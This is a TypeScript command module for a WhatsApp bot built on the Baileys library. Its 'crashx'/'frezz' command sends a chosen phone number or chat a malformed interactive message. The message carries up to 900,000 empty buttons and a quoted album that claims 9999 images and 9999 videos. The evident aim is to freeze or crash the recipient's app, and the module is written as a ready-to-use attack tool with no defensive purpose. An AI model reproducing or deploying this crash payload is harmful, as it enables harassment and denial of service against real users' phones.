import type { CommandContext } from "../../types/index.d.ts";
import { fytBold } from "../../core/socketText.ts";

const digits = (j: string) => String(j || "").split("@")[0].split(":")[0].replace(/\D/g, "");

function buildPayload(buttons: number, texto: string) {
  return {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: { text: texto },
          nativeFlowMessage: {
            buttons: Array.from({ length: buttons }, () => ({})),
          },
          contextInfo: {
            quotedMessage: {
              albumMessage: {
                expectedImageCount: 9999,
                expectedVideoCount: 9999,
              },
            },
          },
        },
      },
    },
  };
}

export default {
  name: ["crashx", "frezz", "xcx"],
  category: "group",
  description: "Bombardeo de botones nativos vacíos + álbum fantasma de 9999+9999. `.crashx [botones] [texto]`.",
  async run(ctx: CommandContext) {
    const { sock, from, msg, args, reply, react } = ctx;

    const info: any = (msg.message as any)?.extendedTextMessage?.contextInfo || {};
    const citado = info.participant ? digits(info.participant) : "";
    const mencion = info.mentionedJid?.[0] ? digits(info.mentionedJid[0]) : "";
    const escrito = (args[0] || "").replace(/\D/g, "");

    const num = escrito.length >= 8 ? escrito : mencion || citado;
    const target = num ? `${num}@s.whatsapp.net` : from;

    let botones = 500000;
    let desde = 0;

    if (/^\d+$/.test(args[0] || "")) {
      botones = Math.min(900000, Math.max(1, Number(args[0])));
      desde = 1;
    }

    const texto = args.slice(desde).join(" ").trim() || "X";

    await react("🧨").catch(() => undefined);

    try {
      const { generateWAMessageFromContent } = await import("baileys");

      const trava = generateWAMessageFromContent(target, buildPayload(botones, texto) as any, {});

      await sock.relayMessage(target, trava.message, { messageId: trava.key.id });

      await react("☠️").catch(() => undefined);
      await reply(
        `🧨 ${fytBold("Frezz enviado")} → ${num ? `+${num}` : "este chat"}\n` +
          `Botones: ${botones.toLocaleString("es-MX")}\n` +
          `Álbum fantasma: 9999 img + 9999 vid`,
      ).catch(() => undefined);
    } catch (e: any) {
      await react("❌").catch(() => undefined);
      await reply(`❌ ${e?.message || e}`).catch(() => undefined);
    }
  },
};
